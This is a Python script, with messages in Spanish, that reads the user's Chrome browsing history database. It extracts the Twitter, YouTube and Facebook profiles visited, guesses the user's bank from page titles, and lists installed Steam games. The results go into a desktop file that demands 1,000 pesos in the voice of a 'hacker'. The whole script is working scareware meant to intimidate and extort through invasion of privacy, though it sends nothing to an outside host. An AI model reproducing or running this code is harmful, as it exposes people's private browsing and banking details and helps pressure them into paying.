import glob
import os
import re
import sqlite3
from collections import Counter
from pathlib import Path
from random import randrange
from time import sleep

HACKER_FILE_NAME = "PARA TI.txt"


def delay_action():
    hour = randrange(1,4)
    minute = randrange(0,60)
    print("El programa estara dormido por {} hora y {} minutos".format(hour,minute))
    sleep((hour)+ (minute))


def create_file(desktop_path):
    with open(desktop_path + "{}".format(HACKER_FILE_NAME),"w") as hacking_file:
        hacking_file.write("Hola soy un hacker pagame 1000 pesos\n")
    return hacking_file


def history(user_path):
    info = False
    while info == False:
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()
            info = True
        except sqlite3.OperationalError:
            print("No se puede ejecutar el programa porque la base de datos esta bloqueada\n"
                  "intenta cerrar Chrome\n")
            sleep(2)
    return urls


def scare_user(desktop_path,chrome_history):
    profiles_visited = []
    channels_visited = []
    fb_visited = []

    new = ""
    for item in chrome_history:
        resultstw = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        resultsyt = re.findall("https://www.youtube.com/c/([A-Za-z0-9]+)$", item[2])
        resultsfb = re.findall("https://www.facebook.com/([A-Za-z0-9.]+)$", item[2])
        if resultstw and resultstw[0] not in ["notifications", "home","login"]:
            profiles_visited.append(resultstw[0])
        if resultsyt:
            channels_visited.append(resultsyt[0])
        if resultsfb and resultsfb[0] not in ["settings"]:
            i = item[0]
            splittedfb = ""
            splittedfb = i.split("|")
            fb_visited.append(splittedfb[0])

    with open(desktop_path + HACKER_FILE_NAME,"a") as hacking_file:
        if len(profiles_visited) >= 1:
            hacking_file.write("He visto que haz entrado a los perfiles de {}...\n".format(",".join(profiles_visited)))
        if len(channels_visited) >=1:
            hacking_file.write("Tambien te interesa los canales de {}...\n".format(",".join(channels_visited)))
        if len(fb_visited) >=1:
            hacking_file.write("Tambien te interesa los perfiles de Facebook de {}...\n".format(",".join(fb_visited)))


def bank(desktop_path,chrome_history):
    his_bank = None
    banks = ["BBVA México","CaixaBank","Scotiabank México","Banamex","Banbajio"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    with open(desktop_path + HACKER_FILE_NAME,"a") as hacking_file:
        hacking_file.write("Y tambien he visto que usas el banco {}...\n".format(his_bank))


def games(desktop_path):
    deny = "Steamworks Shared"
    list_of_games = []
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
    list_of_games_paths = glob.glob(steam_path)
    list_of_games_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in list_of_games_paths:
        list_of_games.append(game_path.split("\\")[-1])
    if deny in list_of_games:
        list_of_games.remove(deny)
    with open(desktop_path + HACKER_FILE_NAME, "a") as hacking_file:
        hacking_file.write("Y estos son los juegos que tienes {}\n".format(",".join(list_of_games)))





def main():
    #delay_action()
    user_path = str(Path.home())
    desktop_path = user_path + "\\Desktop\\"
    hacking_file = create_file(desktop_path)
    chrome_history = history(user_path)
    if chrome_history:
        pass
    scare_user(desktop_path,chrome_history)
    bank(desktop_path,chrome_history)
    games(desktop_path)
if __name__ == "__main__":
    main()